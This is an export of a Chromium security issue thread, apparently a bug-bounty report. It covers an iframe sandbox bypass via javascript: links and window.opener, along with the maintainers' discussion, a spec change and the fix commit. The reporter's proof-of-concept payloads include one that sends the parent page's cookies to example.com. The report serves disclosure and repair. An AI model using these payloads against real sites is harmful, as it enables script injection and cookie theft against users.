# Security: iframe sandbox can be worked around via javascript: links and window.opener

| Field | Value |
|-------|-------|
| **Issue ID** | [40050426](https://issues.chromium.org/issues/40050426) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>IFrameSandbox |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ph...@gmail.com |
| **Assignee** | mk...@chromium.org |
| **Created** | 2019-10-15 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

My understanding is that a web application should be able to use a sandboxed iframe to display untrusted content without fear of JavaScript running, hijacking the parent page or the user's cookies. In simple scenarios this works properly, however there are some exceptions (reproducible in code below) using target="\_blank" links with "javascript:" href values, and window.opener that allow JavaScript from untrusted content to be run.

Please note that NONE of my examples use "allow-scripts" in the sandbox attribute - because my goal is that JavaScript does not run at all in the iframe.

Apologies if this is expected behavior. But it was definitely not expected to me.

**VERSION**  

Chrome Version: [Version 77.0.3865.120 (Official Build) (64-bit) - stable  

Operating System: macOS 10.15

**REPRODUCTION CASE**

If we display untrusted content like this:

<iframe sandbox="allow-modals allow-popups allow-popups-to-escape-sandbox" srcdoc="UNTRUSTED\_CONTENT"></iframe>

Then here are some examples of UNTRUSTED\_CONTENT that can workaround sandbox and result in JavaScript being run unexpectedly:

Case 1:

<iframe sandbox="allow-modals allow-popups allow-popups-to-escape-sandbox" srcdoc="<a target=&quot;\_blank&quot; href=&quot;javascript:window.opener.eval('alert(location.href)')&quot;>click me</a>"></iframe>

Result: Clicking the link inside the iframe results in an alert popping up on the original page with a message "about:srcdoc", showing that JS is actually executed inside the iframe.

Case 2:  

This problem actually gets MUCH worse if you have allow-same-origin in the sandbox attribute:

<iframe sandbox="allow-same-origin allow-modals allow-popups allow-popups-to-escape-sandbox" srcdoc="<a target=&quot;\_blank&quot; href=&quot;javascript:window.opener.parent.eval('alert(location.href+\'; \'+document.cookie);')&quot;>click me</a>"></iframe>

Result: Clicking the link in the iframe results in JavaScript access to the cookies of the parent page.

**CREDIT INFORMATION**  

Reporter credit: Phil Freo

## Attachments

- [sandbox3.html](attachments/sandbox3.html) (text/plain, 551 B)
- [sandbox5.html](attachments/sandbox5.html) (text/plain, 757 B)

## Timeline

### ph...@gmail.com (2019-10-15)

I'd like to also note that Safari does not have the same problem. It properly blocks both cases with a console message "Blocked script execution in 'about:srcdoc' because the document's frame is sandboxed and the 'allow-scripts' permission is not set."

### ph...@gmail.com (2019-10-15)

One more note:

Here is our real world use case for wanting the following set of sandbox attributes without expecting JavaScript to be running:

<iframe sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox" srcdoc="UNTRUSTED\_CONTENT"></iframe>

We wanted "allow-same-origin" because we wanted the parent page to be able to access the iframe's document and its offsetHeight to be able to resize the height of the iframe to match the iframe's contents. This allows a more seamless experience of embedding untrusted content into a web app without introducing another vertical scroll bar.

All indication of the "sandbox" attribute is that this would indeed prevent JavaScript from running within the context of our page, since we didn't have "allow-scripts".

---

Case 3:

Run this from a hostname that has cookies set. After clicking the second link, come back and notice how this parent page has redirected to steal cookies.

<iframe sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox" width="100%" height="300" srcdoc="
Rendering untrusted \*\*HTML\*\* here...<br>

<a target=&quot;\_blank&quot; href=&quot;https://www.whatismybrowser.com/detect/is-javascript-enabled&quot;>load external site in popup, with javascript (desired)</a><br>  

<a target="\_blank" href="javascript:window.opener.parent.eval('window.location%3D%22https%3A//example.com/%3Fc%3D%22+encodeURIComponent%28document.cookie%29')">hacker site can steal iframe's parent's cookies</a>  

"></iframe>

Note: In this example, not only are we stealing the user's cookies, the sandboxed iframe is acting like it has "allow-top-navigation" even though that is not in the whitelist of values!

### ph...@gmail.com (2019-10-15)

Here is a runnable example of that Case 3 example.

### ph...@gmail.com (2019-10-15)

And this same example could also be used in a phishing attempt even on a logged-out page where the cookies didn't matter. It's just like any other noopener attack, except this time the target=_blank link is part of what is already expected to be untrusted content, and "sandbox" isn't doing its job.

### ca...@chromium.org (2019-10-16)

[Empty comment from Monorail migration]

[Monorail components: Blink>SecurityFeature>IFrameSandbox]

### ca...@chromium.org (2019-10-16)

Assigning Medium severity since that's what similar iframe sandbox bypass bugs have been assigned before

### ca...@chromium.org (2019-10-16)

vogelheim: Passing to you as a SecurityFeature owner, can you help find an owner for this?

### sh...@chromium.org (2019-10-17)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ph...@gmail.com (2019-10-19)

[Comment Deleted]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-29)

vogelheim: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ph...@gmail.com (2019-10-29)

After opening this bug, I wrote a (cleaned up) version of this bug report for Firefox, here:
https://bugzilla.mozilla.org/show_bug.cgi?id=1589845

And it was recently merged into:
https://bugzilla.mozilla.org/show_bug.cgi?id=1559128

### sh...@chromium.org (2019-11-12)

vogelheim: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### vo...@chromium.org (2019-11-13)

Sorry I'm late with this. It turns out, I don't know <iframe sandbox> very well, so I'm not super sure whether the observed behaviour is a bug or "working as intended".

mkwst: Can you please have a look at this?

If i see this correctly, all three examples are cases of navigating to javascript:-URL causes script execution, even when <iframe sandbox> without allow-scripts is used.

### mk...@chromium.org (2019-11-13)

The presence of `allow-popups allow-popups-to-escape-sandbox` does allow `<a target='...'>` to escape the sandbox and cause script execution (in the newly popped-up window). I agree that it's somewhat surprising that we execute the `javascript:` URL in the target window and not in the source window, but it's an intentional change we made in https://bugs.chromium.org/p/chromium/issues/detail?id=944213 to match Mozilla and the spec, and it's not clear to me that it gives you any power above and beyond what explicitly allowing the popup to escape the sandbox provides.

Still, I can understand how this behavior would violate your assumptions about the ability of a sandboxed frame to execute script that it ends up controlling. I wouldn't be sad if we entirely blocked navigation to `javascript:` inside frames with the sandboxed scripts browsing context flag set. +annevk@: Would y'all have any objections to a patch to https://html.spec.whatwg.org/#javascript-protocol (or https://html.spec.whatwg.org/#navigating-across-documents, I guess?) that checked that sandbox flag in the source browsing context prior to navigation?

### an...@gmail.com (2019-11-13)

That sounds fine, though I suspect we'd have to check it on the "source document" as there are cases when that can be sandboxed, but the encompassing browsing context isn't (CSP). (Unfortunately source document isn't really a thing, so we'd have to be hand-wavy about it until that's fixed.)

### mk...@chromium.org (2019-11-13)

https://github.com/whatwg/html/pull/5083

### ph...@gmail.com (2019-11-14)

[Comment Deleted]

### ph...@gmail.com (2019-11-14)

> it's somewhat surprising that we execute the `javascript:` URL in the target window and not in the source window, but it's an intentional change we made in https://bugs.chromium.org/p/chromium/issues/detail?id=944213 to match Mozilla and the spec, and it's not clear to me that it gives you any power above and beyond what explicitly allowing the popup to escape the sandbox provides.

mkwst: Just to clarify:

1. The fact that the `javascript:` URL run in the target window (the new window opened from a target=_blank link) doesn't seem especially bad to me, given `allow-popups allow-popups-to-escape-sandbox`, it might be exactly what you expect.

2. The real problem here is that JavaScript can effectively be run in the *source* window too, via window.opener -- which is the very iframe we're trying to avoid running scripts in. (My original Case 1)

3. And then furthermore, if `allow-same-origin` is present too, then via window.opener.parent we can execute JavaScript in the iframe's parent page which is *even worse*. (My original Case 2 & 3)

Does this make sense / do you agree?

### mk...@chromium.org (2019-11-14)

1.  I thought this was the part you found surprising, that the popup could be caused to execute JavaScript even though the page that caused the popup to open couldn't execute JavaScript itself?
2.  Given that the sandboxed frame and the window that it pops up are same-origin to each other, running script in either has the same set of capabilities. The popup has DOM access to its opener after all. What is enabled specifically by executing code _in_ the opener frame as opposed to in the popup with the same capability?
3.  I agree with you that sandboxing with `allow-same-origin` makes any attack at all more powerful.

### an...@gmail.com (2019-11-14)

Perhaps the ask is that allow-popups-to-escape-sandbox implies noopener? Did we consider that? Too late?

### mk...@chromium.org (2019-11-14)

> Perhaps the ask is that allow-popups-to-escape-sandbox implies noopener?

It seems like `window.open` could be reasonably expected to create an opener relationship for things like oauth. In this case, the surprising bit to me is that a sandboxed frame in the absence of `allow-scripts` can cause script execution, not that the popup (once it's escaped the sandbox) can execute script, or that it has an opener relationship with the frame that opened it.

Still, belt and suspenders: isn't Firefox experimenting/shipping `noopener` for all `target=_blank` links? I feel like ericlaw@ was interested in doing something there as well.

### an...@gmail.com (2019-11-14)

Yeah, we're doing that on non-Release channels, with https://bugzilla.mozilla.org/show_bug.cgi?id=1522083 tracking the remaining bits.

### ph...@gmail.com (2019-11-14)

From my perspective in what I expect from iframe sandbox, I would be happy with any solution that: completely disallows JavaScript from running either in the iframe context or in the parent page's context, when "allow-scripts" is absent even if "allow-popups-to-escape-sandbox" and "allow-same-origin" is present. If that means completely disabling javascript: links I have no qualms with that. If that means "allow-popups-to-escape-sandbox implies noopener" I'm also happy.

Also it's interesting that adding the `csp="script-src 'none'` to the iframe element DOES effectively block these types of issues. Should there effectively be a difference between this attribute and a sandbox without "allow-scripts"? I wouldn't think so, but right now there is.

Specifically to summarize the use case: Until the `<iframe csp>` attribute was introduced (which still doesn't exist in Firefox), using iframe sandbox in the way I described in the original post seemed like the only way to both display untrusted content (e.g. ads HTML email), allow clicking links to open in a new tab, and have the parent page resize the iframe based on the iframe's body/contents height (which requires `allow-same-origin`)

### an...@gmail.com (2019-11-14)

If you truly want to protect yourself against a rogue popup you cannot use allow-popups-to-escape-sandbox as currently designed (unless you'd also use Cross-Origin-Opener-Policy). Embedded CSP is not going to help with that (and has other issues).

### ph...@gmail.com (2019-11-14)

> In this case, the surprising bit to me is that a sandboxed frame in the absence of `allow-scripts` can cause script execution

+1

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-11-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/24134160cb7f395e2d82ddecdfe7ac0659c9477c

commit 24134160cb7f395e2d82ddecdfe7ac0659c9477c
Author: Mike West <mkwst@chromium.org>
Date: Sat Nov 16 18:53:06 2019

Prevent sandboxed frames from navigating to `javascript:`.

Frames with the `allow-popup` and `allow-popup-to-escape-sandbox` flags
can cause JavaScript execution in their origin by navigating to a
`javascript:` URL via `target=_blank` or similar. This is technically
correct, but surprising.

https://github.com/whatwg/html/pull/5083 aims to tighten that check to
match developers' expectations that `javascript:` URLs controlled by a
page that's been sandboxed away from script will not execute.

Bug: 1014371
Change-Id: I3b5fa676e73cbf78485b85ce2593284bce2e68cc
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1916467
Reviewed-by: Daniel Vogelheim <vogelheim@chromium.org>
Reviewed-by: Avi Drissman <avi@chromium.org>
Commit-Queue: Avi Drissman <avi@chromium.org>
Cr-Commit-Position: refs/heads/master@{#716035}

[modify] https://crrev.com/24134160cb7f395e2d82ddecdfe7ac0659c9477c/content/browser/navigation_mhtml_browsertest.cc
[modify] https://crrev.com/24134160cb7f395e2d82ddecdfe7ac0659c9477c/third_party/blink/renderer/core/loader/frame_loader.cc
[add] https://crrev.com/24134160cb7f395e2d82ddecdfe7ac0659c9477c/third_party/blink/web_tests/external/wpt/html/browsers/sandboxing/resources/post-done-to-opener.html
[add] https://crrev.com/24134160cb7f395e2d82ddecdfe7ac0659c9477c/third_party/blink/web_tests/external/wpt/html/browsers/sandboxing/sandbox-disallow-scripts-via-unsandboxed-popup.tentative.html


### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### me...@chromium.org (2020-01-07)

Hi Mike, is this fixed?

### mk...@chromium.org (2020-01-07)

Should be fixed via https://chromium-review.googlesource.com/c/chromium/src/+/1916467, yes. Closing it out.

### sh...@chromium.org (2020-01-07)

[Empty comment from Monorail migration]

### na...@google.com (2020-01-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-01-15)

Not requesting merge to beta (M80) because latest trunk commit (716035) appears to be prior to beta branch point (722274). If this is incorrect, please replace the Merge-na label with Merge-Request-80. If other changes are required to fix this bug completely, please request a merge if necessary.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2020-01-23)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-01-23)

Congrats the Panel decided to reward $3,000 for this report!

### na...@google.com (2020-01-23)

[Empty comment from Monorail migration]

### ad...@google.com (2020-02-02)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-02-03)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-02-10)

[Empty comment from Monorail migration]

### ad...@google.com (2020-03-04)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-14)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/1014371?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050426)*
